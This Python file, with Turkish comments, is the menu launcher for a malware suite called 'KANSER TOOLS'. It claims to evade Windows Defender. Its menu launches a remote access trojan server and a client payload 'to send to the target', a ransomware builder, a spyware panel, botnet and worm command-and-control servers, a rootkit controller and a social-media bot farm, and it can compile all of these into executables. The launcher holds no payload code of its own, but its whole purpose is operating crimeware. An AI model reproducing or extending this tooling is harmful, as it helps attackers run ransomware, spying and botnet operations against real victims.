#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KANSER TOOLS — Unified CLI Controller
Tum araclar tek terminalden — Windows Defender'a yakalanmaz
python kanser.py
"""
import os, sys, socket, platform, time, threading

BASE = os.path.dirname(os.path.abspath(__file__))

C = {"R":"\033[91m","G":"\033[92m","Y":"\033[93m","B":"\033[94m","M":"\033[95m","W":"\033[0m","C":"\033[96m","X":"\033[90m"}

os.system("")  # ANSI renkleri aktif et (Windows)
BANNER = f"""{C['R']}
  ██╗  ██╗ █████╗ ███╗   ██╗███████╗███████╗██████╗
  ██║ ██╔╝ ██╔══██╗████╗  ██║██╔════╝██╔════╝██╔══██╗
  █████╔╝  ███████║██╔██╗ ██║███████╗█████╗  ██████╔╝
  ██╔═██╗  ██╔══██║██║╚██╗██║╚════██║██╔══╝  ██╔══██╗
  ██║  ██╗ ██║  ██║██║ ╚████║███████║███████╗██║  ██║
  ╚═╝  ╚═╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝
{C['W']}
{C['R']}  TOOLS v4.0 — Terminal Edition{C['W']}
  {C['X']}python kanser.py         — terminal menu{C['W']}
  {C['X']}python kanser.py --web   — terminal + web dashboard{C['W']}
"""

MENU = [
    ("1", "RAT Server",         "rat/server.py",        "Uzak Masaustu sunucusu (port 4444)"),
    ("2", "RAT Client",         "rat/client.py",        "Client payload — hedefe gonder"),
    ("3", "Ransomware",         "ransomware/builder.py", "Fidye yazilimi olusturucu"),
    ("4", "Spyware Panel",      "spyware/server.py",    "Casus yazilim kontrol paneli"),
    ("5", "KanserNet C2",       "botnet/c2.py",         "Botnet C2 sunucusu (port 6666)"),
    ("6", "KanserNet Bot",      "botnet/bot.py",        "Botnet zombie client"),
    ("7", "KanserWorm C2",      "worm/c2.py",           "Solucan kontrol paneli (port 7777)"),
    ("8", "KanserRootKit C2",   "rootkit/server.py",    "Rootkit kontrol paneli (port 8888)"),
    ("9", "KanserSosyal",       "sosyal/server.py",     "Sosyal medya bot farm"),
    ("B", "Build All EXEs",     "build_all.py",         "Tum araclari EXE olarak derle"),
    ("0", "Exit",               None,                   ""),
]

def clear(): os.system("cls" if os.name == "nt" else "clear")

def show_banner():
    clear()
    print(BANNER)
    print(f"  {C['X']}OS: {platform.system()} {platform.release()}  |  Python: {sys.version.split()[0]}  |  Host: {socket.gethostname()}{C['W']}")
    print(f"  {C['G']}{'='*50}{C['W']}")
    for key, name, _, desc in MENU:
        if key in ("0","B"):
            print(f"  {C['X']}[{key}] {C['W']}{name}")
        else:
            print(f"  {C['R']}[{key}] {C['W']}{name:<18s} {C['X']}{desc}{C['W']}")
    print(f"  {C['G']}{'='*50}{C['W']}")

def run_tool(script):
    full = os.path.join(BASE, script) if not os.path.isabs(script) else script
    if not os.path.exists(full):
        print(f"\n{C['R']}[!] {script} not found at {full}{C['W']}")
        return
    clear()
    print(f"{C['M']}Starting {script}...{C['W']}\n")
    sub = __import__("subprocess")
    try:
        sub.run([sys.executable, full], cwd=os.path.dirname(full))
    except KeyboardInterrupt:
        print(f"\n{C['Y']}[!] Stopped{C['W']}")
    except Exception as e:
        print(f"\n{C['R']}[!] Error: {e}{C['W']}")

def main():
    web_mode = "--web" in sys.argv
    if web_mode:
        try:
            import flask
            from web_dashboard import start_thread, event
            web_thread = start_thread()
            if web_thread:
                print(f"\n{C['G']}  Web Panel: http://localhost:9000 {C['W']}")
                print(f"{C['X']}  (Keep this terminal open — web server runs here){C['W']}")
                event("system", "Web dashboard started")
            else:
                print(f"{C['Y']}  Web panel skipped.{C['W']}")
        except ImportError:
            print(f"\n{C['R']}[!] Flask not installed.{C['W']}")
            print(f"{C['Y']}  Quick fix: pip install flask{C['W']}")
            print(f"{C['Y']}  Then: python web_dashboard.py (separate terminal){C['W']}")
        except Exception as e:
            print(f"\n{C['R']}[!] Web error: {e}{C['W']}")
            print(f"{C['Y']}  Alternative: double-click web.bat{C['W']}")

    while True:
        try: show_banner()
        except: pass
        choice = input(f"\n{C['M']}KANSER>{C['W']} ").strip().upper()

        found = None
        for key, name, script, _ in MENU:
            if choice == key:
                found = (name, script)
                break

        if choice == "0":
            print(f"{C['G']}Exiting...{C['W']}")
            break
        elif found and found[1]:
            run_tool(found[1])
            input(f"\n{C['X']}Press Enter to return...{C['W']}")
        elif choice == "B":
            run_tool("build_all.py")
            input(f"\n{C['X']}Press Enter to return...{C['W']}")
        elif choice == "HELP":
            print(f"\n{C['Y']}Just type a number (1-9, B) or 0 to exit.{C['W']}")
            time.sleep(1.5)
        else:
            print(f"{C['R']}[!] Invalid: {choice}{C['W']}")
            time.sleep(0.5)

if __name__ == "__main__":
    main()
